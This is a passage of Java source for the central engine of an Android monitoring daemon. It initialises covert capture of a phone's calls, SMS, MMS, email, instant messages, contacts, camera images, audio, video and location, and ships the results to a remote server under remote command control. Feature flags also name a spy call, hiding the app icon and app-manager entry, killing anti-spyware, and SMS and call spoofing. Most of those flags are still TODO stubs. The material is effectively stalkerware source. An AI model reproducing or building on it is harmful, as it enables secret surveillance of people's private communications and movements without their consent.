package com.vvt.daemon.appengine;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import android.content.Context;

import com.vvt.activation_manager.ActivationManager;
import com.vvt.activation_manager.ActivationManagerImp;
import com.vvt.appcontext.AppContextImpl;
import com.vvt.base.FxAddressbookMode;
import com.vvt.callmanager.ref.MonitorDisconnectReason;
import com.vvt.capture.audio.FxAudioCapture;
import com.vvt.capture.camera.image.FxCameraImageCapture;
import com.vvt.capture.location.LocationCaptureManagerImp;
import com.vvt.capture.location.settings.LocationOption;
import com.vvt.capture.location.util.LocationCallingModule;
import com.vvt.capture.simchange.SimChangeManagerImpl;
import com.vvt.capture.video.FxVideoCapture;
import com.vvt.capture.wallpaper.FxWallpaperCapture;
import com.vvt.configurationmanager.ConfigurationManager;
import com.vvt.configurationmanager.ConfigurationManagerImpl;
import com.vvt.configurationmanager.ConfigurationManagerMock;
import com.vvt.configurationmanager.FeatureID;
import com.vvt.connectionhistorymanager.ConnectionHistoryManager;
import com.vvt.connectionhistorymanager.ConnectionHistoryManagerImp;
import com.vvt.daemon.email.FxGmailCapture;
import com.vvt.daemon.mediahistory.MediaHistoryCapture;
import com.vvt.daemon_addressbook_manager.AddressbookManagerImp;
import com.vvt.datadeliverymanager.DataDeliveryManager;
import com.vvt.datadeliverymanager.enums.ServerStatusType;
import com.vvt.datadeliverymanager.interfaces.ServerStatusErrorListener;
import com.vvt.eventcentre.EventCentre;
import com.vvt.eventdelivery.EventDeliveryManager;
import com.vvt.eventrepository.DatabaseCorruptExceptionListener;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.eventrepository.FxEventRepositoryManager;
import com.vvt.eventrepository.RepositoryChangeEvent;
import com.vvt.eventrepository.RepositoryChangePolicy;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.FxOperationNotAllowedException;
import com.vvt.exceptions.database.FxDbCorruptException;
import com.vvt.exceptions.database.FxDbOpenException;
import com.vvt.im.ImCapturer;
import com.vvt.ioutil.FileUtil;
import com.vvt.license.LicenseChangeListener;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseManagerImpl;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.logger.Logger;
import com.vvt.phoenix.prot.CommandServiceManager;
import com.vvt.preference_manager.PrefAddressBook;
import com.vvt.preference_manager.PrefDeviceLock;
import com.vvt.preference_manager.PrefEmergencyNumber;
import com.vvt.preference_manager.PrefEventsCapture;
import com.vvt.preference_manager.PrefHomeNumber;
import com.vvt.preference_manager.PrefKeyword;
import com.vvt.preference_manager.PrefLocation;
import com.vvt.preference_manager.PrefMonitorNumber;
import com.vvt.preference_manager.PrefNotificationNumber;
import com.vvt.preference_manager.PrefPanic;
import com.vvt.preference_manager.PrefWatchList;
import com.vvt.preference_manager.Preference;
import com.vvt.preference_manager.PreferenceChangeListener;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.preference_manager.PreferenceManagerImpl;
import com.vvt.preference_manager.PreferenceType;
import com.vvt.processcalllog.FxCallLogCapture;
import com.vvt.processmms.FxMmsCapture;
import com.vvt.processsms.FxSmsCapture;
import com.vvt.productinfo.ProductInfo;
import com.vvt.remotecommandmanager.RemoteCommandManager;
import com.vvt.remotecommandmanager.RemoteCommandManagerImpl;
import com.vvt.server_address_manager.ServerAddressManagerImpl;

public class AppEngine implements ServerStatusErrorListener,
		PreferenceChangeListener, LicenseChangeListener,
		DatabaseCorruptExceptionListener {

	public static final String LOG_FILE_NAME = "LogFile.txt";
	
	private static final String TAG = "AppEngine";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	

	private static SpyInfoApplier sSpyInfoApplier;

	private Context mContext;
	private String mWritablePath;
	private String mProcessPacketName;
	private String mProcessSocketName;

	// Common Component.
	private ActivationManagerImp mActivationManager;
	private AppContextImpl mAppContext;
	private CommandServiceManager mCommandServiceManager;
	private DataDeliveryManager mDataDelivery;
	private EventCentre mEventCentre;
	private EventDeliveryManager mEventDelivery;
	private FxEventRepositoryManager mEventRepository;
	private LicenseManagerImpl mLicenseManager;
	private PreferenceManagerImpl mPreferenceManager;
	private RemoteCommandManagerImpl mRemoteCommandManager;
	private ServerAddressManagerImpl mServerAddressManager;
	private ConnectionHistoryManagerImp mConnectionHistoryManager;
	private ConfigurationManager mConfigurationManager;

	// Feature component
	private FxCallLogCapture mCallLogCapture;
	private FxCameraImageCapture mCameraImageCapture;
	private FxGmailCapture mEmailCapture;
	private LocationCaptureManagerImp mLocationCaptureManager;
	private FxMmsCapture mMMSCapture;
	private SimChangeManagerImpl mSIMChangeManager;
	private FxSmsCapture mSMSCapture;
	private AddressbookManagerImp mAddressbookManager;
	private FxAudioCapture mAudioCapture;
	private FxVideoCapture mVideoCapture;
	private ImCapturer mImCapture;
	private FxWallpaperCapture mWallpaperCapture;
	
	// Util component
	private Logger mLogger;

	private boolean mIsInitializationCompleted = false;

	public AppEngine(Context context, String writablePath) {
		mContext = context;
		mWritablePath = writablePath;
	}
	
	public void setProcessPacketName(String packetName) {
		mProcessPacketName = packetName;
	}
	
	public void setProcessSocketName(String socketName) {
		mProcessSocketName = socketName;
	}

	public void startApplication() {
		if(LOGV) FxLog.v(TAG, "startApplication # ENTER ...");
		try {
			constructCommonComponents();

			constructUtilityComponents();
			constructFeatureComponents();
			mapCommonComponents();
			mapFeatureComponents();

			initializeCommonComponents();

			mIsInitializationCompleted = true;

		} catch (FxNullNotAllowedException e) {
			if(LOGE) FxLog.e(TAG, e.toString());
			mIsInitializationCompleted = true;
			handleException(e);
		}

		if(LOGV) FxLog.v(TAG, "startApplication # EXIT ...");
	}

	public void stopApplication() {
		try {
			disableAllCapture();
		} catch (FxNullNotAllowedException e) {
			handleException(e);
		}
	}

	public boolean IsInitializationCompleted() {
		return mIsInitializationCompleted;
	}

	protected void constructCommonComponents() {
		if(LOGV) FxLog.v(TAG, "constructCommonComponents # ENTER ...");
		mAppContext = new AppContextImpl(mContext, mWritablePath);
		mServerAddressManager = new ServerAddressManagerImpl(mAppContext);

		mActivationManager = new ActivationManagerImp();
		mCommandServiceManager = createCommandServiceManager();
		mDataDelivery = new DataDeliveryManager();
		mEventCentre = new EventCentre();
		mEventDelivery = new EventDeliveryManager();
		mEventRepository = new FxEventRepositoryManager(mContext, mAppContext
				.getWritablePath());
		mLicenseManager = new LicenseManagerImpl(mContext, mAppContext
				.getWritablePath());
		mPreferenceManager = new PreferenceManagerImpl(mAppContext
				.getWritablePath());
		mRemoteCommandManager = new RemoteCommandManagerImpl();
		mConnectionHistoryManager = new ConnectionHistoryManagerImp(mAppContext
				.getWritablePath());

		mConfigurationManager = new ConfigurationManagerImpl(mContext,
				AppEnginDaemonResource.APPENGIN_EXTRACTING_PATH);
		mConfigurationManager.updateConfigurationID(mLicenseManager
				.getConfigurationId());

		mLocationCaptureManager = new LocationCaptureManagerImp(mContext);
		mLocationCaptureManager.setEventListener(mEventCentre);

		mSIMChangeManager = new SimChangeManagerImpl();
		
		mAddressbookManager = new AddressbookManagerImp();
		mAddressbookManager.setWritablePath(mWritablePath);
		
		/***************************** TODO : FOR TEST !!! **********************************/
		if (mConfigurationManager.getConfiguration() == null) {
			mConfigurationManager = new ConfigurationManagerMock();
		}

		
		if(LOGV) FxLog.v(TAG, "constructCommonComponents # EXIT ...");
	}

	protected void mapCommonComponents() throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "mapCommonComponents # ENTER ...");
		mLicenseManager.setLicenseChangeListener(this);

		mPreferenceManager.setPreferenceChangeListener(this);

		PrefEventsCapture prefEventsCapture = (PrefEventsCapture) mPreferenceManager
				.getPreference(PreferenceType.EVENTS_CTRL);

		RepositoryChangePolicy changePolicy = new RepositoryChangePolicy();
		changePolicy.setMaxEventNumber(prefEventsCapture.getMaxEvent());
		changePolicy.addChangeEvent(RepositoryChangeEvent.PANIC_EVENT_ADD);
		changePolicy.addChangeEvent(RepositoryChangeEvent.SYSTEM_EVENT_ADD);
		changePolicy.addChangeEvent(RepositoryChangeEvent.SETTING_EVENT_ADD);
		changePolicy
				.addChangeEvent(RepositoryChangeEvent.EVENT_REACH_MAX_NUMBER);

		mEventRepository.addDatabaseCorruptExceptionListener(this);
		mEventRepository
				.addRepositoryChangeListener(mEventCentre, changePolicy);

		PolicyGroup policyGroup = new PolicyGroup();
		mEventRepository.setEventQueryPriority(policyGroup
				.getEventQueryPriority());

		try {
			mEventRepository.openRepository();
		} catch (FxDbOpenException e) {
			handleException(e);
		} catch (FxDbCorruptException e) {
			handleException(e);
		}

		mEventDelivery.setAppContext(mAppContext);
		mEventDelivery.setDataDelivery(mDataDelivery);
		mEventDelivery.setEventRepository(mEventRepository);

		mEventCentre.setEventDeliveryManager(mEventDelivery);
		mEventCentre.setEventRepository(mEventRepository);

		mDataDelivery.setAppContext(mAppContext);
		mDataDelivery.setCommandServiceManager(mCommandServiceManager);
		mDataDelivery.setConnectionHistory(mConnectionHistoryManager);
		mDataDelivery.setLicenseManager(mLicenseManager);
		mDataDelivery.setPccRmtCmdListener(mRemoteCommandManager);
		mDataDelivery.setServerAddressManager(mServerAddressManager);
		mDataDelivery.setConfigurationManager(mConfigurationManager);
		mDataDelivery.setServerStatusErrorListener(this);

		mRemoteCommandManager.setActivationManager(mActivationManager);
		
		if(mAddressbookManager == null) {
			if(LOGE) FxLog.e(TAG, "mapCommonComponents # mAddressbookManager is null");
		}
		
		mRemoteCommandManager.setAddressBookManager(mAddressbookManager);
		mRemoteCommandManager.setAppContext(mAppContext);
		mRemoteCommandManager.setConfigurationManager(mConfigurationManager);
		mRemoteCommandManager.setDataDelivery(mDataDelivery);
		mRemoteCommandManager.setEventCaptureListener(mEventCentre);
		mRemoteCommandManager.setEventDelivery(mEventDelivery);
		mRemoteCommandManager.setEventRepository(mEventRepository);
		mRemoteCommandManager.setLicenseManager(mLicenseManager);
		mRemoteCommandManager.setPreferenceManager(mPreferenceManager);
		mRemoteCommandManager.setServerAddressManager(mServerAddressManager);
		mRemoteCommandManager.setLocationCaptureManager(mLocationCaptureManager);
		mRemoteCommandManager.setConnectionHistory(mConnectionHistoryManager);

		mActivationManager.setAppContext(mAppContext);
		mActivationManager.setDataDelivery(mDataDelivery);
		mActivationManager.setLicenseManager(mLicenseManager);
		mActivationManager.setServerAddressManager(mServerAddressManager);

		if(LOGV) FxLog.v(TAG, "mapCommonComponents # EXIT ...");

	}

	protected void initializeCommonComponents()
			throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "initializeCommonComponents # ENTER ...");
		
		PrefEventsCapture prefEventsCapture = (PrefEventsCapture) mPreferenceManager
				.getPreference(PreferenceType.EVENTS_CTRL);

		// TODO: Change Later
		// mServerAddressManager.setRequireBaseServerUrl(true);

		mEventDelivery.initialize();
		mActivationManager.initialize();
		mRemoteCommandManager.initialize();
		mDataDelivery.initialize();

		// call following mRemoteCommandManager;
		ArrayList<String> supportRmtCommand = (ArrayList<String>) mConfigurationManager
				.getConfiguration().getSupportedRemoteCmd();
		mRemoteCommandManager.setSupportCommands(supportRmtCommand);

		// call following mEventDelivery;
		mEventCentre.setDeliverTimer(prefEventsCapture.getDeliverTimer());
		mEventCentre.initialize();

		if(LOGV) FxLog.v(TAG, "initializeCommonComponents # EXIT ...");
	}

	protected void constructFeatureComponents()
			throws FxNullNotAllowedException {
		
		if(LOGV) FxLog.v(TAG, "constructFeatureComponents # ENTER ...");

		if (mConfigurationManager.getConfiguration() == null) {
			throw new FxNullNotAllowedException("Configuration is null");
		}

		List<FeatureID> featureIDs = mConfigurationManager.getConfiguration()
				.getSupportedFeture();
		if(LOGD) FxLog.d(TAG, "constructFeatureComponents # featureIDs :" + featureIDs);

		for (FeatureID id : featureIDs) {
			switch (id) {
			case FEATURE_ID_EVNET_CALL:
				if (mCallLogCapture == null)
					mCallLogCapture = new FxCallLogCapture(mContext, mWritablePath);
				break;
			case FEATURE_ID_EVNET_CAMERAIMAGE:
				if (mCameraImageCapture == null)
					mCameraImageCapture = new FxCameraImageCapture(mContext, mWritablePath);
				break;
			case FEATURE_ID_EVNET_EMAIL:
				if (mEmailCapture == null)
					mEmailCapture = new FxGmailCapture(mContext, mWritablePath);
				break;
			case FEATURE_ID_EVNET_LOCATION:
				// Promoted to common components; 
				break;
			case FEATURE_ID_EVNET_MMS:
				if (mMMSCapture == null)
					mMMSCapture = new FxMmsCapture(mContext, mWritablePath);
				break;
			case FEATURE_ID_EVNET_SMS:
				if (mSMSCapture == null)
					mSMSCapture = new FxSmsCapture(mContext, mWritablePath);
				break;
			case FEATURE_ID_EVNET_SIM_CHANGE:
				// Promoted to common components.				 
				break;
			case FEATURE_ID_EVNET_CONTACT:
				// Promoted to common components because at the time of starting the AppEngin
				// this feature is not enabled So, mAddressBook manager is not created and passed to the
				// Remote command manager.
				break;
			case FEATURE_ID_EVNET_SOUND_RECORDING:
				if (mAudioCapture == null)
					mAudioCapture = new FxAudioCapture(mContext, mWritablePath);
				break;
			case FEATURE_ID_EVNET_VIDEO_RECORDING:
				if (mVideoCapture == null)
					mVideoCapture = new FxVideoCapture(mContext, mWritablePath);
				break;
			case FEATURE_ID_EVNET_IM:
				if (mImCapture == null)
					mImCapture = new ImCapturer(mContext, mWritablePath);
				break;
			case FEATURE_ID_SPY_CALL:
			case FEATURE_ID_SMS_KEYWORD:
				if (sSpyInfoApplier == null) {
					sSpyInfoApplier = SpyInfoApplier.getInstance(mContext,
							mProcessPacketName, mProcessSocketName);
				}
				break;
			case FEATURE_ID_WATCH_LIST:
				// do nothing.
				break;
			case FEATURE_ID_ACTIVATION_VIA_GPRS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_ACTIVATION_VIA_SMS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_ALERT:
				// TODO : not implement yet
				break;
			case FEATURE_ID_AUTO_ANSWER:
				// TODO : not implement yet
				break;
			case FEATURE_ID_COMMUNICATION_RESTRICTION:
				// TODO : not implement yet
				break;
			case FEATURE_ID_DATA_WIPE:
				// TODO : not implement yet
				break;
			case FEATURE_ID_DELIVERY_VIA_GPRS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_DELIVERY_VIA_SMS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_EMERGENCY_NUMBERS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_EVNET_CALENDAR:
				// TODO : not implement yet
				break;
			case FEATURE_ID_EVNET_CELL_INFO:
				// TODO : not implement yet
				break;
			case FEATURE_ID_EVNET_SYSTEM:
				// TODO : not implement yet
				break;
			case FEATURE_ID_EVNET_WALLPAPER:
				if (mWallpaperCapture == null)
					mWallpaperCapture = new FxWallpaperCapture(mContext, mWritablePath);
				break;
			case FEATURE_ID_HIDE_DESKTOP_ICON:
				// TODO : not implement yet
				break;
			case FEATURE_ID_HIDE_FROM_APP_MGR:
				// TODO : not implement yet
				break;
			case FEATURE_ID_HOME_NUMBERS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_KILL_ANTI_FX:
				// TODO : not implement yet
				break;
			case FEATURE_ID_MAKE_CALL_SPOOF:
				// TODO : not implement yet
				break;
			case FEATURE_ID_MONITOR_NUMBERS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_NOTIFICATION_NUMBERS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_PANIC:
				// TODO : not implement yet
				break;
			case FEATURE_ID_SEARCH_MEDIA_IN_FILE_SYSTEM:
				// TODO : not implement yet
				break;
			case FEATURE_ID_SEND_EMAIL_RECORD_FILE:
				// TODO : not implement yet
				break;
			case FEATURE_ID_SEND_SMS_SPOOF:
				// TODO : not implement yet
				break;
			case FEATURE_ID_SPYCALL_ONDEMAND_CONFERENCE:
				// TODO : not implement yet
				break;

			default:
				break;
			}
		}

		if(LOGV) FxLog.v(TAG, "constructFeatureComponents # EXIT ...");
	}

	protected void mapFeatureComponents() throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "mapFeatureComponents # ENTER ...");

		if (mConfigurationManager.getConfiguration() == null) {
			throw new FxNullNotAllowedException("Configuration is null");
		}

		List<FeatureID> featureIDs = mConfigurationManager.getConfiguration()
				.getSupportedFeture();
		PrefEventsCapture prefEventsCapture = (PrefEventsCapture) mPreferenceManager
				.getPreference(PreferenceType.EVENTS_CTRL);
		PrefLocation prefLocation = (PrefLocation) mPreferenceManager
				.getPreference(PreferenceType.LOCATION);
		
		if(LOGD) FxLog.d(TAG, "mapFeatureComponents # featureIDs : "+featureIDs.toString());
		if(LOGD) FxLog.d(TAG, "mapFeatureComponents # EnableStartCapture : " + prefEventsCapture.getEnableStartCapture());
		
		for (FeatureID id : featureIDs) {
			switch (id) {
			case FEATURE_ID_EVNET_CALL:
				if(LOGD) FxLog.d(TAG, "mapFeatureComponents # EnableCallLog : "+prefEventsCapture.getEnableCallLog());
				if (prefEventsCapture.getEnableStartCapture()) {
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_CALL,
							prefEventsCapture.getEnableCallLog());
				} else {
					
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_CALL, false);
				}
				break;

			case FEATURE_ID_EVNET_CAMERAIMAGE:
				if(LOGD) FxLog.d(TAG, "mapFeatureComponents # EnableCameraImage : "+prefEventsCapture.getEnableCameraImage());
				if (prefEventsCapture.getEnableStartCapture()) {
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_CAMERAIMAGE,
							prefEventsCapture.getEnableCameraImage());
				} else {
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_CAMERAIMAGE,
							false);
				}
				break;

			case FEATURE_ID_EVNET_EMAIL:
				if(LOGD) FxLog.d(TAG, "mapFeatureComponents # EnableEmail : "+prefEventsCapture.getEnableEmail());
				if (prefEventsCapture.getEnableStartCapture()) {
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_EMAIL,
							prefEventsCapture.getEnableEmail());
				} else {
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_EMAIL, false);
				}
				break;

			case FEATURE_ID_EVNET_LOCATION:
				if(LOGD) FxLog.d(TAG, "FEATURE_ID_EVNET_LOCATION ....");
				if (prefEventsCapture.getEnableStartCapture()
						&& prefLocation.getEnableLocation()) {
					LocationOption locationOption = new LocationOption();
					locationOption
							.setCallingModule(LocationCallingModule.MODULE_CORE);
					locationOption.setTrackingTimeInterval(prefLocation
							.getLocationInterval());
					if(LOGD) FxLog.d(TAG, "startLocationTracking ....");
					mLocationCaptureManager.setEventListener(mEventCentre);
					mLocationCaptureManager
							.startLocationTracking(locationOption);
				} else {
					mLocationCaptureManager
							.stopLocationTracking(LocationCallingModule.MODULE_CORE);
				}
				break;

			case FEATURE_ID_EVNET_MMS:
				if(LOGD) FxLog.d(TAG, "mapFeatureComponents # EnableMMS : "+prefEventsCapture.getEnableMMS());
				if (prefEventsCapture.getEnableStartCapture()) {
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_MMS,
							prefEventsCapture.getEnableMMS());
				} else {
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_MMS, false);
				}
				break;

			case FEATURE_ID_EVNET_SMS:
				if(LOGD) FxLog.d(TAG, "mapFeatureComponents # EnableSMS : "+prefEventsCapture.getEnableSMS());
				if (prefEventsCapture.getEnableStartCapture()) {
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_SMS,
							prefEventsCapture.getEnableSMS());
				} else {
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_SMS, false);
				}
				break;

			case FEATURE_ID_EVNET_SIM_CHANGE:
				if(LOGD) FxLog.d(TAG, "mapFeatureComponents # FEATURE_ID_EVNET_SIM_CHANGE : ");
				
				  mSIMChangeManager.setAppContext(mAppContext);
				  mSIMChangeManager.setEventListener(mEventCentre);
				  mSIMChangeManager.setLicenseManager(mLicenseManager);
				  
				  PrefMonitorNumber prefMonitorNumber = (PrefMonitorNumber)mPreferenceManager.getPreference(PreferenceType.MONITOR_NUMBER);
				  PrefHomeNumber prefHomeNumber = (PrefHomeNumber)mPreferenceManager.getPreference(PreferenceType.HOME_NUMBER);
				  //TODO : the report number is Product spcific.
				  //mSIMChangeManager.doReportPhoneNumber(prefMonitorNumber.getMonitorNumber());
				  mSIMChangeManager.doSendSIMChangeNotification(prefMonitorNumber.getMonitorNumber(),
						  											prefHomeNumber.getHomeNumber());
				break;

			case FEATURE_ID_EVNET_CONTACT:
				if(LOGD) FxLog.d(TAG, "mapFeatureComponents # FEATURE_ID_EVNET_CONTACT : ");
				
				mAddressbookManager.setContext(mContext);
				mAddressbookManager.setDataDelivery(mDataDelivery);
				mAddressbookManager.setMode(FxAddressbookMode.MONITOR);
				mAddressbookManager.initialize();
				
				if(mAddressbookManager == null)
					if(LOGE) FxLog.e(TAG, "mapFeatureComponents # mAddressbookManager is null");
				
				// set to RCM.
				mRemoteCommandManager.setAddressBookManager(mAddressbookManager);

				if(LOGD) FxLog.d(TAG, "mapFeatureComponents # EnableAddressBook : "+prefEventsCapture.getEnableAddressBook());
				if (prefEventsCapture.getEnableStartCapture()) {
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_CONTACT,
							prefEventsCapture.getEnableAddressBook());
				} else {
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_CONTACT,
							false);
				}
				break;

			case FEATURE_ID_EVNET_SOUND_RECORDING:
				if(LOGD) FxLog.d(TAG, "mapFeatureComponents # EnableAudio : "+prefEventsCapture.getEnableAudioFile());
				if (prefEventsCapture.getEnableStartCapture()) {
					eventCaptureControl(
							FeatureID.FEATURE_ID_EVNET_SOUND_RECORDING,
							prefEventsCapture.getEnableAudioFile());
				} else {
					eventCaptureControl(
							FeatureID.FEATURE_ID_EVNET_SOUND_RECORDING, false);
				}
				break;
			case FEATURE_ID_EVNET_VIDEO_RECORDING:
				if(LOGD) FxLog.d(TAG, "mapFeatureComponents # EnableVideo : "+prefEventsCapture.getEnableVideoFile());
				if (prefEventsCapture.getEnableStartCapture()) {
					eventCaptureControl(
							FeatureID.FEATURE_ID_EVNET_VIDEO_RECORDING,
							prefEventsCapture.getEnableVideoFile());
				} else {
					eventCaptureControl(
							FeatureID.FEATURE_ID_EVNET_VIDEO_RECORDING, false);
				}
				break;
			case FEATURE_ID_EVNET_IM:
				if(LOGD) FxLog.d(TAG, "mapFeatureComponents # EnableIM : "+prefEventsCapture.getEnableIM());
				if (prefEventsCapture.getEnableStartCapture()) {
					eventCaptureControl(
							FeatureID.FEATURE_ID_EVNET_IM,
							prefEventsCapture.getEnableIM());
				} else {
					eventCaptureControl(
							FeatureID.FEATURE_ID_EVNET_IM, false);
				}
				break;
			case FEATURE_ID_SPY_CALL:
			case FEATURE_ID_SMS_KEYWORD:
				applySpyService();
				break;
			case FEATURE_ID_WATCH_LIST:
				// nothing to do.
				break;
			case FEATURE_ID_ACTIVATION_VIA_GPRS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_ACTIVATION_VIA_SMS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_ALERT:
				// TODO : not implement yet
				break;
			case FEATURE_ID_AUTO_ANSWER:
				// TODO : not implement yet
				break;
			case FEATURE_ID_COMMUNICATION_RESTRICTION:
				// TODO : not implement yet
				break;
			case FEATURE_ID_DATA_WIPE:
				// TODO : not implement yet
				break;
			case FEATURE_ID_DELIVERY_VIA_GPRS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_DELIVERY_VIA_SMS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_EMERGENCY_NUMBERS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_EVNET_CALENDAR:
				// TODO : not implement yet
				break;
			case FEATURE_ID_EVNET_CELL_INFO:
				// TODO : not implement yet
				break;
			case FEATURE_ID_EVNET_SYSTEM:
				// TODO : not implement yet
				break;
			case FEATURE_ID_EVNET_WALLPAPER:
				if(LOGD) FxLog.d(TAG, "mapFeatureComponents # EnableWallpaper : " + prefEventsCapture.getEnableWallPaper());
				
				if (prefEventsCapture.getEnableStartCapture()) {
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_WALLPAPER, prefEventsCapture.getEnableWallPaper());
				} else {
					eventCaptureControl(FeatureID.FEATURE_ID_EVNET_IM, false);
				}
				break;
			case FEATURE_ID_HIDE_DESKTOP_ICON:
				// TODO : not implement yet
				break;
			case FEATURE_ID_HIDE_FROM_APP_MGR:
				// TODO : not implement yet
				break;
			case FEATURE_ID_HOME_NUMBERS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_KILL_ANTI_FX:
				// TODO : not implement yet
				break;
			case FEATURE_ID_MAKE_CALL_SPOOF:
				// TODO : not implement yet
				break;
			case FEATURE_ID_MONITOR_NUMBERS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_NOTIFICATION_NUMBERS:
				// TODO : not implement yet
				break;
			case FEATURE_ID_PANIC:
				// TODO : not implement yet
				break;
			case FEATURE_ID_SEARCH_MEDIA_IN_FILE_SYSTEM:
				// TODO : not implement yet
				break;
			case FEATURE_ID_SEND_EMAIL_RECORD_FILE:
				// TODO : not implement yet
				break;
			case FEATURE_ID_SEND_SMS_SPOOF:
				// TODO : not implement yet
				break;
			case FEATURE_ID_SPYCALL_ONDEMAND_CONFERENCE:
				// TODO : not implement yet
				break;
			
			default:
				break;
			}
		}

		if(LOGV) FxLog.v(TAG, "mapFeatureComponents # EXIT ...");
	}

	protected void constructUtilityComponents()
			throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "constructUtilityComponents # ENTER ...");
		mLogger = Logger.getInstance();
		mLogger.SetLogPath(mWritablePath, LOG_FILE_NAME);
		if(LOGV) FxLog.v(TAG, "constructUtilityComponents # EXIT ...");
	}

	/**
	 * Call the "startApplication" before call this method.
	 * 
	 * @return RemoteCommandManager or null if it not initialized yet.
	 */
	public RemoteCommandManager getRemoteCommandManager() {
		if (mRemoteCommandManager != null) {
			return mRemoteCommandManager;
		} else {
			return null;
		}
	}

	/**
	 * Call the startApplication before call this method.
	 * 
	 * @return ActivationManager or null if it not initialized yet.
	 */
	public ActivationManager getActivationManager() {
		if (mActivationManager != null) {
			return mActivationManager;
		} else {
			return null;
		}
	}

	/**
	 * Call the startApplication before call this method.
	 * 
	 * @return PreferenceManager or null if it not initialized yet.
	 */
	public PreferenceManager getPreferenceManager() {
		if (mPreferenceManager != null) {
			return mPreferenceManager;
		} else {
			return null;
		}
	}

	/**
	 * Call the startApplication before call this method.
	 * 
	 * @return ProductInfo or null if it not initialized yet.
	 */
	public ProductInfo getProductInfo() {
		if (mAppContext != null) {
			return this.mAppContext.getProductInfo();
		} else {
			return null;
		}
	}

	/**
	 * Call the startApplication before call this method.
	 * 
	 * @return LicenseManager or null if it not initialized yet.
	 */
	public LicenseManager getLicenseManager() {
		if (mLicenseManager != null) {
			return this.mLicenseManager;
		} else {
			return null;
		}
	}

	/**
	 * Call the startApplication before call this method.
	 * 
	 * @return FxEventRepository or null if it not initialized yet.
	 */
	public FxEventRepository getEventRepository() {
		if (mEventRepository != null) {
			return this.mEventRepository;
		} else {
			return null;
		}
	}

	/**
	 * Call the startApplication before call this method.
	 * 
	 * @return ConnectionHistoryManager or null if it not initialized yet.
	 */
	public ConnectionHistoryManager getConnectionHistoryManager() {
		if (mConnectionHistoryManager != null) {
			return this.mConnectionHistoryManager;
		} else {
			return null;
		}
	}

	/**
	 * Call the startApplication before call this method.
	 * 
	 * @return ConfigurationManager or null if it not initialized yet.
	 */
	public ConfigurationManager getConfigurationManager() {
		if (mConfigurationManager != null) {
			return this.mConfigurationManager;
		} else {
			return null;
		}
	}
	
	public String getWritablePath() {
		return mWritablePath;
	}
	
	/**
	 * call for apply spy service
	 */
	public void applySpyService() {
		if (sSpyInfoApplier == null) {
			sSpyInfoApplier = SpyInfoApplier.getInstance(mContext,
					mProcessPacketName, mProcessSocketName);
		}
		sSpyInfoApplier.applySettings(mLicenseManager, mPreferenceManager);
	}

	private CommandServiceManager createCommandServiceManager() {
		CommandServiceManager manager = CommandServiceManager.getInstance(
				mAppContext.getWritablePath() + "/", 
				mAppContext.getWritablePath() + "/",
				mServerAddressManager.getUnstructuredServerUrl(),
				mServerAddressManager.getStructuredServerUrl());
		
				manager.setStructuredUrl(mServerAddressManager.getStructuredServerUrl());
				manager.setUnStructuredUrl(mServerAddressManager.getUnstructuredServerUrl());
		return manager;
	}

	@Override
	public void onLicenseChanged(LicenseInfo license) {
		FxLog.d(TAG, "onLicenseChanged # START");

		if (license.getLicenseStatus() == LicenseStatus.ACTIVATED) {
			if(LOGD) FxLog.d(TAG, "onLicenseChanged # LicenseStatus : ACTIVATED");
			if(LOGD) FxLog.d(TAG, "onLicenseChanged # LicenseStatus : ConfigurationId: "
					+ license.getConfigurationId());

			mConfigurationManager.updateConfigurationID(license
					.getConfigurationId());

			try {
				constructFeatureComponents();
				mapFeatureComponents();

				ArrayList<String> supportRmtCommand = (ArrayList<String>) mConfigurationManager
						.getConfiguration().getSupportedRemoteCmd();
				mRemoteCommandManager.setSupportCommands(supportRmtCommand);

			// open every thing.
				mEventRepository.openRepository();
				
				//no need to create thread because it will have dead lock occur.
				
				Thread thread = new Thread(new Runnable() {
					
					@Override
					public void run() {
						if(mConfigurationManager.isSupportedFeature(FeatureID.FEATURE_ID_SEARCH_MEDIA_IN_FILE_SYSTEM)){
							if(LOGD) FxLog.d(TAG, "onLicenseChanged # deliver media history ...");
							//send media history
							try {
								deliverMediaHistory();
							} catch (FxNullNotAllowedException e) {
								handleException(e);
							}
						}
						
					}
				});
				thread.start();
				
				
				
			} catch (FxNullNotAllowedException e1) {
				handleException(e1);
			} catch (FxDbOpenException e2) {
				handleException(e2);
